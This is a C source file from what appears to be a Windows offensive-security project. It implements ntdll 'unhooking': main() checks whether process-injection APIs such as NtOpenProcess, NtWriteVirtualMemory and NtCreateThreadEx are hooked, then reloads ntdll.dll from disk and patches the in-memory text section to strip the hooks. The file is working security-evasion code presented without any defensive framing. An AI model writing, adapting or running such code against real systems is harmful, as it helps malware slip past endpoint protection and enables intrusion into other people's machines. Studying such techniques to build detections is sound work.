#include "NtdllPatcher.h"

BOOL ReadFileFromDisk(PCHAR pFilePath, PVOID* pBuffer, DWORD* dwSize)
{
	HANDLE			hFile = NULL;
	DWORD			dwBytesRead = 0;
	LARGE_INTEGER	FileSize = { 0 };
	BOOL			Result = FALSE;

	hFile = CreateFileA(pFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileA Failed With: %d\n", GetLastError());
		goto __Cleanup;
	}

	if (!GetFileSizeEx(hFile, &FileSize)) {
		printf("[-] GetFileSizeEx Failed With: %d\n", GetLastError());
		goto __Cleanup;
	}

	*dwSize = FileSize.QuadPart;
	*pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *dwSize);
	if (!*pBuffer) {
		printf("[-] HeapAlloc Failed\n");
		goto __Cleanup;
	}

	if (!ReadFile(hFile, *pBuffer, *dwSize, &dwBytesRead, NULL)) {
		printf("[-] ReadFile Failed With: %d\n", GetLastError());
		goto __Cleanup;
	}

	Result = TRUE;

__Cleanup:
	if (*pBuffer && !Result) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, *pBuffer);
	if (hFile) CloseHandle(hFile);

	return (Result);
}

int main()
{
	HANDLE	hNtdll = NULL;
	CHAR	FilePath[MAX_PATH] = "C:\\Windows\\System32\\ntdll.dll";
	PVOID	Buffer = NULL;
	DWORD	BufferSize = NULL;

	hNtdll = GetModuleHandleW(L"Ntdll");
	if (IsHooked(hNtdll, "NtOpenProcess") || IsHooked(hNtdll, "NtWriteVirtualMemory") ||
		IsHooked(hNtdll, "NtAllocateVirtualMemory") || IsHooked(hNtdll, "NtCreateThreadEx"))
	{
		puts("[!] One Of The Used API is Hooked");
		puts("[*] Press <ENTER> To Patch Ntdll");
		getchar();

		// Read Ntdll From Disk
		if (!ReadFileFromDisk(FilePath, &Buffer, &BufferSize)) {
			puts("Failed To Read Ntdll From Disk");
			goto __Cleanup;
		}

		// Patch Ntdll Text Section
		if (!NtdllPatcher(hNtdll, Buffer)) {
			puts("[-] Failed to Patch Ntdll");
			goto __Cleanup;
		}
	}

	puts("[+] You're Good To Go!");
	getchar();

__Cleanup:
	if (Buffer) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

	return (0);
}